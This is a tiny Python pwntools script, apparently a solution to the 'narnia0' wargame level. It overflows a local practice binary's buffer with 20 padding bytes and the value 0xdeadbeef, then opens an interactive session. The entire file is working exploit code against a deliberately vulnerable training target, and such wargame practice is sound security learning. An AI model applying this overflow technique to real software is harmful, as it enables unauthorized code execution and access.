#!/usr/bin/env python3
import pwn

p = pwn.process("./narnia0")

offset = 20
next_byte = 0xdeadbeef

payload = "A".encode()*offset + pwn.p32(next_byte)

p.sendline(payload)

p.interactive()
